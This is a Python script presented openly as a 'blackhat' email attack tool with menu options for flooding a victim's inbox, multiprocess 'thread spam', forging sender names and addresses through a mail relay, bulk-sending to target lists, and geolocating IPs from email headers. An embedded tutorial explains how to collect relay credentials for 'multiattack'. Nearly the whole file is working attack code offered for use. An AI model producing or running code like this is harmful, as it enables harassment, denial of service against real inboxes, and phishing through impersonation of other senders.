# This is a email spammer tool

import os
import sys
import random
from time import sleep
from os import system
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from threading import Thread
import multiprocessing
import pandas
import re
import pyperclip
import phpserialize
import requests
from email.parser import HeaderParser
parser = HeaderParser()
process = []
# -----------------colors
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[1;37m"
g = "\033[0;90m"
y = r
# ------------------------



steps = """Visit the Sendinblue website: Open your web browser and go to the official Sendinblue website at https://www.sendinblue.in.
Click on "Sign Up": On the homepage, you should find a prominent "Sign Up" button. Click on it to proceed.
Choose your account type: Sendinblue offers two types of accounts: "I want to send marketing campaigns" or "I want to send transactional emails." Select the appropriate option based on your requirements.
Enter your information: Fill out the registration form with the necessary details. This typically includes your email address, password, and other relevant information.
Verify your email address: After submitting the registration form, Sendinblue will send a verification email to the address you provided. Check your inbox and click on the verification link within the email to confirm your account.
Complete your profile: Once your email address is verified, you'll be prompted to complete your profile. Provide the requested information, including your name, company name, and contact details.
Explore Sendinblue features: After completing your profile, you'll gain access to your Sendinblue dashboard. Take some time to familiarize yourself with the various features and tools available for email marketing or transactional emails.
To obtain the host email port, you may need to check your email account settings. Here's a general outline of how you can find the email server settings:
Access your email account: Log in to the email account that you want to integrate with Sendinblue.
Navigate to account settings: Look for a "Settings" or "Preferences" option within your email account. This can usually be found in the top-right corner or under a drop-down menu.
Find server or connection settings: Within the account settings, search for an option related to "Server Settings," "SMTP Settings," or "Connection Settings." Click on it to access the required information.
Locate the host and port: In the server settings, you should find the host (SMTP server) and port information. The host will typically be in the form of an SMTP server address, such as "smtp.example.com," and the port number will commonly be 25, 465, or 587. Make a note of these details.
Note: The specific steps to find the host email port may vary depending on your email service provider. If you encounter any difficulties, consult your email provider's documentation or support resources for assistance. By following these steps, you should be able to sign up on Sendinblue.in and obtain the host email port for your email account.
after get host, port, email, mastertoken just all details put on .xlsx file of database and if you are going to deal with multiattack then you have to above steps multiples times to get the host port email and master token and put on database.xlsx and also you have to give all and email target email address in emailt.conf and their meassage in message.html and start script
before starting you must confirm that all modules must install and internet connectivity must be strong.
let's go guys put 'python main.py' on console and as your requirement select attack and start.
Email Spamming - its simple flooding to your vicitm email address.
Email Thread - its flooding with multiprocessing to your vicitms email address with superfast.
Email Spoofing - using this attack you will able to send email to your vicitm using desire email address of anyone.
Email Multisender - using this attack your all email will flood to your victim email address's.
Email Tracking - this will just take a header of email message then provide us some important info about sender."""




# some function ----

def cmd(xcmd):
    system(xcmd)


def vaim_print_2(xcontent):
    print(r+"─> "+w+"\033[1;37m"+xcontent+r)


def vaim_print_3(xcontent, xxx):
    print(r+xxx+w+" > \033[1;37m "+xcontent+r)


def vaim_print_4(xcontent, xxx):
    print(r+xxx+w+" \033[1;37m "+xcontent+r)


def backie():
    ritik_welcome = [

        'Thanks for using our tool',
        'Keep using this tool Thanks Brother !!!',
        'Bye dear :)',
        'Hope you enjoy with this tool',
        'We are Vaimpier :) Bye',
        'Thankyou so much dear :)',
        'Keep learning keep hacking :)',
        'Bye :) Next Update soon',
        'We have many tools like this subscribe our channel to get more',
        'Have a Good day dear :) ',
        'Vaimpier Ritik says :) Thanks dear Bye :_)'


    ]

    print(r+"└─"+w+"[!] "+y+random.choice(ritik_welcome))
    back = input(r+"..└─"+w+"\033[1;37mBack [ y / n ]: "+r)
    if back == 'y' or back == 'Y':
        system("clear")
    if back == 'n' or back == 'N':
        backie()
    else:
        backie()


def byebaby():
    sys.exit()


def flowing(vaim):
    for letter in vaim:
        sleep(0.03)
        sys.stdout.write(letter)
        sys.stdout.flush()


def flowing2(vaim):
    for letter in vaim:
        sleep(0.001)
        sys.stdout.write(letter)
        sys.stdout.flush()
    print("\n")


def Database():
    Login_Data = pandas.read_excel("conf/Database.xlsx")
    return Login_Data["Email"], Login_Data["Password"], Login_Data["Host"], Login_Data["Port"]


# sending mail------------------------------------------------------
"""
def vaimpier(email, password, host, port, emailt, count, message, spoof):
    try:
        s = smtplib.SMTP(str(host), int(port))
        s.starttls()
    except:
        print(r+"└─"+w+"[ ✖ ] Failed : "+r +
                "Put right Host or Port !!! :_)\n")
        exit()
    try:
        s.login(email, password)
    except:
        print(r+"└─"+w+"[ ✖ ] Login Failed : "+r +
                "Put right Mail or Password or check lessecure apps enable or not !!! :_)\n")
        exit()
    z = 0
    qw = 0
    for i in range(0, count):
        msg = MIMEMultipart()
        msg["To"] = emailt
        msg["from"] = spoof + "<any@gmail.com>"
        msg.attach(MIMEText(message, 'html'))
        s.send_message(msg)
        print(
            r+str(qw)+"> └─"+w+"[ ✔ ] Sucessfully sent to >"+r, i+1, emailt+w+" from : "+email)
        qw = qw+1
    s.close()
"""
# -------------------------------------------------------------------

# ------------------------


def greet(functions):
    def mfunctions():
        os.system('cls' if os.name != "posix" else 'clear')
        w1 = b
        b1 = w
        print(w1+"/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\//")
        print("\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/")
        print("/\/\                                                      /\/\\")
        print("\/\/"+b1+"  <Program>"+g+"  Spam Your Vicitm With Mail" +
              b1+"    </Program> "+w1+"\/\/")
        print("/\/\      "+b1+"</>  "+g +
              "Adavance Mail Attack( Blackhat ) "+b1+" </>"+w1+"      /\/\\")
        print("\/\/                                                      \/\/")
        print("/\/\      "+b1+"<Developer>  "+g +
              " Vaimpier Ritik  "+b1+"</Developer>"+w1+"      /\/\\")
        print("\/\/  "+b1+"<Github>  "+g +
              "www://gthb./VaimpierOfficial"+b1+" </Github>"+w1+"    \/\/")
        print("/\/\                                                      /\/\\")
        print("\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/")
        print("/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\")
        functions()
        print("\n")

    return mfunctions

# ------------All Classess living here-----------


class EmailSpammer:
    def __init__(self):
        self.tar_email = "email"
        self.limit = 10

    def extract_email_info(self, header):
        ip_addresses = re.findall(
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', header)
        subject = re.search(r'Subject:\s(.*?)\n', header)
        message = re.search(
            r'Content-Type: text/html; charset=utf-8\r\nMIME-Version: 1.0\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n(.*?)\r\n\r\n--===============', header, re.DOTALL)
        headers = re.findall(r'^(.*?):\s(.*?)\n', header, re.MULTILINE)

        self.extracted_info = {
            'IP Addresses': ip_addresses,
            'Subject': subject,
            'Message': message,
            'Headers': headers
        }

        return self.extracted_info

    def print_email_info(self, info, header):
        email_info = parser.parsestr(header)
        print("")
        print("> \033[1;37m " + "Extracted Email Information::"+r)
        print(r + "────────────────────────────────" + w + ">  ")
        for ip in info['IP Addresses']:
            try:
                if requests.get("http://ip-api.com/php/").status_code == 200:
                    deserialized_data = phpserialize.unserialize(
                        requests.get(f"http://ip-api.com/php/{ip}").content)
                    print(r+"└─"+w+"[ @ ] Parsed Data : "+r)
                    print(r + "────────────────────────────────" + w + ">  ")
                    for key, value in deserialized_data.items():
                        print("{}: {}".format(key, value))
                else:
                    print("> \033[1;37m " + "Internet Issue's:"+r)
            except:
                continue
        print("> \033[1;37m " + "All IP related to email:"+r)
        for ip in info['IP Addresses']:
            flowing2(ip)
        print("> \033[1;37m " + "Date:"+r)
        flowing2(email_info['Date'])
        print("> \033[1;37m " + "Delivered-To"+r)
        flowing2(email_info['Delivered-To'])
        print("> \033[1;37m " + "Received"+r)
        flowing2(email_info['Received'])
        print("> \033[1;37m " + "To"+r)
        flowing2(email_info['To'])
        print("> \033[1;37m " + "Message-Id"+r)
        flowing2(email_info['Message-Id'])
        print("> \033[1;37m " + "From"+r)
        flowing2(email_info['From'])

        """

        for header in info['Headers']:
            print(f"{header[0]}: {header[1]}")
        """

    def vaimpier(self, email, password, host, port, emailt, count, message, spoof, sp_mail, subject="1"):
        try:
            s = smtplib.SMTP(str(host), int(port))
            s.starttls()
        except:
            print(r+"└─"+w+"[ ✖ ] Failed : "+r +
                    "Put right Host or Port !!! :_)\n")
            exit()
        try:
            s.login(email, password)
        except:
            print(r+"└─"+w+"[ ✖ ] Login Failed : "+r +
                    "Put right Mail or Password or check lessecure apps enable or not !!! :_)\n")
            exit()
        z = 0
        qw = 0
        msg = MIMEMultipart()
        msg["To"] = emailt
        if subject != "1":
            msg['Subject'] = subject
        else:
            pass
        msg["from"] = spoof + f"<{sp_mail}>"
        msg.attach(MIMEText(message, 'html'))
        for i in range(0, count):
            s.send_message(msg)
            print(r+str(qw)+"> └─"+w +
                  "[ ✔ ] Sucessfully sent to >"+r, i+1, emailt+w+" from : "+email)
            qw = qw+1
        s.close()

    def spam(self):
        self.tar_email = input(
            r + "─" + w + "> \033[1;37m " + "Enter Target Email ~#  " + r)
        self.spoof = input(
            r + "─" + w + "> \033[1;37m " + "Enter Spoof name ~#  " + r)
        self.limit = input(
            r + "─" + w + "> \033[1;37m " + "Enter Limit ~#  " + r)
        self.message = input(
            r + "─" + w + "> \033[1;37m " + "Enter Message ~#  " + r)

        self.email, self.password, self.host, self.port = Database()
        e = int(len(self.email))
        for xo in range(0, e):
            try:
                self.vaimpier(self.email[int(xo)], self.password[int(xo)],
                              self.host[int(xo)], self.port[int(xo)], self.tar_email, int(self.limit), self.message, self.spoof, self.email[int(xo)])
            except:
                err__ = ['lol', 'ho gya bro', 'sad life', ':(', 'Something']
                print(r+"└─"+w+"[!]"+r+random.choice(err__))
                sys.exit()
        input("> \033[1;37m " + "Press 'Enter' To Continue...  " + r)

    def ThreadSpam(self):
        self.tar_email = input(
            r + "─" + w + "> \033[1;37m " + "Enter Target Email ~#  " + r)
        self.spoof = input(
            r + "─" + w + "> \033[1;37m " + "Enter Spoof name ~#  " + r)
        self.limit = input(
            r + "─" + w + "> \033[1;37m " + "Enter Limit ~#  " + r)
        self.message = input(
            r + "─" + w + "> \033[1;37m " + "Enter Message ~#  " + r)

        self.email, self.password, self.host, self.port = Database()
        e = int(len(self.email))
        proces = []
        for xo in range(0, e):
            try:
                p1 = multiprocessing.Process(target=self.vaimpier, args=[self.email[int(xo)], self.password[int(
                    xo)], self.host[int(xo)], self.port[int(xo)], self.tar_email, int(self.limit), self.message, self.spoof, self.email[int(xo)]])
                p1.start()
                proces.append(p1)
            except:
                err__ = ['lol', 'ho gya bro', 'sad life', ':(', 'Something']
                print(r+"└─"+w+"[!]"+r+random.choice(err__))
                sys.exit()
        for proc in proces:
            proc.join()
        input("> \033[1;37m " + "Press 'Enter' To Continue...  " + r)

    def Spoofing(self):
        self.sp_mail = input(
            r + "─" + w + "> \033[1;37m " + "Enter Spoof Email Address ~#  " + r)
        self.tar_email = input(
            r + "─" + w + "> \033[1;37m " + "Enter Target Email ~#  " + r)
        self.spoof = input(
            r + "─" + w + "> \033[1;37m " + "Enter Spoof name ~#  " + r)
        self.limit = input(
            r + "─" + w + "> \033[1;37m " + "Enter Limit ~#  " + r)
        self.subject = input(
            r + "─" + w + "> \033[1;37m " + "Enter Subject ~#  " + r)
        self.message = input(
            r + "─" + w + "> \033[1;37m " + "Enter Message ~#  " + r)
        self.email, self.password, self.host, self.port = Database()
        e = int(len(self.email))
        proces = []
        for xo in range(0, e):
            try:
                if self.host[int(xo)] == "smtp-relay.sendinblue.com":
                    pass
                else:
                    continue
                p1 = multiprocessing.Process(target=self.vaimpier, args=[self.email[int(xo)], self.password[int(
                    xo)], self.host[int(xo)], self.port[int(xo)], self.tar_email, int(self.limit), self.message, self.spoof, self.sp_mail, self.subject])
                p1.start()
                proces.append(p1)
            except:
                err__ = ['lol', 'ho gya bro', 'sad life', ':(', 'Something']
                print(r+"└─"+w+"[!]"+r+random.choice(err__))
                sys.exit()
        try:
            for proc in proces:
                proc.join()
        except:
            err__ = ['lol', 'ho gya bro', 'sad life', ':(', 'Something']
            print(r+"└─"+w+"[!]"+r+random.choice(err__))
            sys.exit()
        input("> \033[1;37m " + "Press 'Enter' To Continue...  " + r)

    def Track(self):
        while True:
            try:
                user_input = input(
                    r + "─" + w + "> \033[1;37m " + "Only Email Headers and Type [ > '" + r + "done'"+w+" ] " + r)
                if user_input == "done":
                    break
                else:
                    continue
            except KeyboardInterrupt:
                # Handle keyboard interrupt (Ctrl+C)
                print("\nExiting...")
                break
            except Exception as e:
                # Handle other exceptions
                print("Error:", str(e))

        header = f"""{pyperclip.paste()}"""
        result = self.extract_email_info(header)
        self.print_email_info(result, f"""{pyperclip.paste()}""")
        input("> \033[1;37m " + "Press 'Enter' To Continue...  " + r)

    def start(self, value, pointers, email, emailt, password, host, port, limit, message, spoof, subject):
        if value == len(email):
            print("[!] You exceeded your limit. Please try again.")
            value = 0
            self.start(value, pointers, email, emailt, password, host, port, limit, message, spoof, subject)

        if pointers == len(emailt):
            print("[!] Done.")
            sys.exit()

        for _ in range(pointers, len(emailt)):
            for ritik in emailt:
                try:
                    try:
                        self.vaimpier(email[value], password[value], host[value], port[value], ritik, limit, message, spoof, ritik, subject)
                        pointers+=1
                    except:
                        value = value + 1
                        self.start(value, pointers, email, emailt, password, host, port, limit, message, spoof, subject)
                except KeyboardInterrupt:
                    # Handle keyboard interrupt (Ctrl+C)
                    print("\nExiting...")
                    break

    def multisender(self):
        self.spoof = input(
            r + "─" + w + "> \033[1;37m " + "Enter Spoof name ~#  " + r)
        self.limit = input(
            r + "─" + w + "> \033[1;37m " + "Enter Limit ~#  " + r)
        self.subject = input(
            r + "─" + w + "> \033[1;37m " + "Enter Subject ~#  " + r)
        # opening reading files------------------
        self.email, self.password, self.host, self.port = Database()
        try:
            self.message = open('conf/message.html', 'r').read()
            emailt = open('conf/emailt.conf', 'r').read()
            emailt = emailt.split()
        except:
            print("> \033[1;37m " + "Files not found:"+r)
        # ---------------------------------------

        self.start(0, 0, self.email, emailt, self.password, self.host, self.port, int(
            self.limit), self.message, self.spoof, self.subject)
        input("> \033[1;37m " + "Press 'Enter' To Continue...  " + r)


class Menu(EmailSpammer):
    def __init__(self):
        pass

    def textstyle(self, vaim):
        for letter in vaim:
            sleep(0.001)
            sys.stdout.write(letter)
            sys.stdout.flush()
        print("\n")

    def vaim_print_1(self, xcontent):
        self.textstyle(r+"└─> "+w+"\033[1;37m"+xcontent+r)


    def help(self):
        os.system('cls' if os.name != "posix" else 'clear')
        print("-->\033[1;37m " + " STEPS FOR USE THIS SCRIPT\n")
        lines = steps.split("\n")
        self.stepss = list(map(self.vaim_print_1, lines))
        input("> \033[1;37m " + "Press 'Enter' To Continue...  " + r)

    def menu(self, strings):
        self.xcontent = strings
        self.xcontent = self.xcontent.split(',')
        self.xcontent = list(map(self.vaim_print_1, self.xcontent))
        self.select_attack = 0
        # Remove unnecessary print() around input()
        print(r + "─" + w + "> \033[1;37m " + "Enter Choice ~#" + r)
        # Convert input to integer for comparison
        self.select_attack = int(
            input((r + "────────────────────────────────" + w + ">  ")))
        if self.select_attack == 1:
            super().spam()
        elif self.select_attack == 2:
            super().ThreadSpam()
        elif self.select_attack == 3:
            super().Spoofing()
        elif self.select_attack == 4:
            super().Track()
        elif self.select_attack == 5:
            super().multisender()
        elif self.select_attack == 6:
            self.help()
        elif self.select_attack == 7:
            sys.exit()
        else:
            greet(lambda: 1)()
            Menu.menu(
                self, "1. Email Spamming,2. Email Thread Spam,3. Email Spoofing,4. Email Tracking,5. Email MutiBlusting,6. Email Attack Tutorial,7. Close The Script Now")
        greet(lambda: 1)()
        Menu.menu(
            self, "1. Email Spamming,2. Email Thread Spam,3. Email Spoofing,4. Email Tracking,5. Email MutiBlusting,6. Email Attack Tutorial,7. Close The Script Now")

# ----------execution from here-------------------


if __name__ == '__main__':
    greet(lambda: 1)()
    attacksmenu = Menu()
    attacksmenu.menu(
        "1. Email Spamming,2. Email Thread Spam,3. Email Spoofing,4. Email Tracking,5. Email MutiBlusting,6. Email Attack Tutorial,7. Close The Script Now")
